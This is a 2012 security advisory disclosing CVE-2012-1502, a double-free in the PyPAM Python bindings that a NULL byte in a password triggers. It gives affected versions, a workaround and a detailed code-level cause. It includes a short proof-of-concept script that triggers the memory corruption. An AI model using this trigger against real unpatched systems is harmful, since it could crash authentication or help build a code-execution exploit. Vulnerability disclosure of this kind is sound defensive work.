@@ -1,0 +1,106 @@
+=== LSE Leading Security Experts - Security Advisory 2012-03-01 ===
+
+PyPAM -- Python bindings for PAM - Double Free Corruption
+---------------------------------------------------------
+
+Affected Versions
+=================
+PyPAM <= 0.4.2
+Red Hat PyPAM <= 0.5.0-12
+Debian python-pam <= 0.4.2-12.2
+Ubuntu python-pam <= 0.4.2-12.2
+SUSE python-pam <= 0.5.0-79.1.2
+Gentoo pypam <= 0.5.0
+
+Problem Overview
+================
+Technical Risk: high
+Likelihood of Exploit: low to medium
+Vendor: Rob Riggs, Various
+Discovery: Markus Vervier
+Advisory URL: http://www.lsexperts.de/advisories/lse-2012-03-01.txt
+Advisory Status: Public
+CVE-Number: CVE-2012-1502
+
+Problem Description
+===================
+While conducting an internal test LSE discovered that by supplying
+a password containing a NULL-byte to the PyPAM module, a double-free [1]
+condition is triggered. This leads to undefined behaviour and may allow
+remote code execution.
+
+Temporary Workaround and Fix
+============================
+Filtering NULL-bytes in strings before passing them to the PyPAM module
+will mitigate the exploit. Also current GLIBC protections may prevent
+the double-free condition from being exploitable. It is advised to update
+to a fixed version of PyPAM.
+
+Detailed Description
+====================
+When PyArg_ParseTuple() in line 81 of PAMmodule.c is given a string with
+Null-Bytes, a TypeError exception is raised [2]. The security problem is in
+line 82 of PAMmodule.c where free() is called on *resp, but *resp is not
+set to NULL. On line 95 in libpam's v_prompt.c the _pam_drop macro calls
+free on the response again unless (*resp == NULL), which leads to
+undefined behaviour.
+
+The following PoC script triggers the problem:
+
+<--snip-->
+#!/usr/bin/env python
+##
+## python-pam 0.4.2 double free PoC
+## 
+## 2012 Leading Security Experts GmbH
+## Markus Vervier
+##
+# -*- coding: utf-8 -*-
+
+def verify_password(user, password):
+    import PAM
+    def pam_conv(auth, query_list, userData):
+        resp = []
+        resp.append( (password, 0))
+        return resp
+    res = -3
+    service = 'passwd'
+
+    auth = PAM.pam()
+    auth.start(service)
+    auth.set_item(PAM.PAM_USER, user)
+    auth.set_item(PAM.PAM_CONV, pam_conv)
+    try:
+        auth.authenticate()
+        auth.acct_mgmt()
+    except PAM.error, resp:
+        print 'Go away! (%s)' % resp
+        res = -1
+    except:
+        print 'Internal error'
+        res = -2
+    else:
+        print 'Good to go!'
+        res = 0
+
+    return res
+
+print verify_password("root", "a\x00secret")
+<--snip--> 
+
+History
+=======
+2012-03-02  Problem discovery during internal QA
+2012-03-05  Original vendor and Debian maintainer contacted
+2012-03-06  Public Patch released
+2012-03-07  Various maintainers contacted
+2012-03-07  CVE-2012-1502 assigned
+2012-03-08  LSE learned in that this bug was previously discovered and fixed in rPath Linux [3]
+2012-03-08  Coordinated Advisory Release
+
+References
+==========
+[1] http://cwe.mitre.org/data/definitions/415.html
+[2] http://docs.python.org/release/1.5.2p2/ext/parseTuple.html
+[3] https://issues.rpath.com/browse/RPL-2773
+                                                                                                                                          
